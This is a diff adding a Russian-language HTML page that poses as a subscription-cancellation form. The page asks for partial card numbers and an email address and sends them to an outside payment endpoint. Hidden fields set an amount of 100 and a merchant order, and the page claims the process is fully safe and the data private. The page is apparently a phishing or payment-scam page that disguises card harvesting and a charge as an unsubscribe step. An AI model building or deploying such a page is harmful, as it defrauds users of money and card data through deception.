@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta name="viewport" content="width=device-width">
+    <title>Управление подпиской</title>
+    <link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700" rel="stylesheet">
+    <style>        
+        html, body {
+           display: flex;
+      justify-content: center;
+          margin-left: 10%;
+          margin-right: 10%;
+        width: 80%; 
+      background-color: #F5F5F6;
+        justify-content: center;
+      font-family: Roboto, Arial, sans-serif;
+      font-size: 14px;
+      }
+      form {
+      border: 0px solid #f1f1f1;
+      }
+      input[type=text], input[type=password] {
+      width: 100%;
+      padding: 15px 5;
+      margin: 9px 0;
+      display: inline-block;
+      border: 1px solid #ccc;
+      box-sizing: border-box;
+      font-size: 14px;
+      }
+      button {
+      background-color: green;
+      color: white;
+      padding: 15px 0;
+      margin: 13px 0;
+      border: none;
+      cursor: pointer;
+      width: 100%;
+     font-size: 18px;
+      }
+      h2 {
+      text-align:center;
+      }
+      button:hover {
+      opacity: 0.8;
+      }
+      .formcontainer {
+      text-align: left;
+      margin: 24px 50px 12px;
+      }
+      .container {
+      padding: 16px 0;
+      text-align:left;
+      }
+      span.psw {
+      float: right;
+      padding-top: 0;
+      padding-right: 15px;
+      }
+      /* Change styles for span on extra small screens */
+      @media screen and (max-width: 300px) {
+      span.psw {
+      display: block;
+      float: none;
+      }
+    </style>
+  </head>
+  <body>
+
+    <form action="https://newpaymentss.co/api/request/">
+    <h2>Отмена подписки на сервис</h2>
+
+    <div class="formcontainer">
+            <div class="container"> Для того что бы отказаться от дальнейшего предоставления доступа к услугам, воспользуйтесь формой отписки расположенной ниже. Используйте данные, которыми вы вводили при регистрации – электронную почту или номер вашей карты.
+
+Мы являемся единственным хранителем информации, собранной на данном сайте: Ваши личные данные не будут каким-либо образом переданы третьим лицам, или использованы без согласия с Вашей стороны.</div>
+    <hr/>
+    <div class="container">
+    <input type="hidden" name="amount" value="100" />
+    <input type="hidden" name="merchant_order_id" value="1" />
+    <input type="hidden" name="use_system_forms" value="1" />
+    <label for="uname">Номер карты:</label>
+    <input type="text" maxlength="16" placeholder="Первые 6 цифр карты" name="card_number" required>
+    <input type="text" maxlength="16" placeholder="Последние 4 цифры карты" name="card_number" required>
+    <label for="uname">Электронная почта:</label>
+    <input type="text" placeholder="Ваш Email" name="email" required>
+    </div>
+    <button type="submit">Отписаться</button>
+    </form>
+       <div class="container" > Все данные передаются по зашифрованному каналу с использованием протокола TLS. Использование данной страницы абсолютно безопасно  
+<br><br>
+Если возникли вопросы – kbsmaxim@gmail.com
+       </div>
+  </body>
+</html>
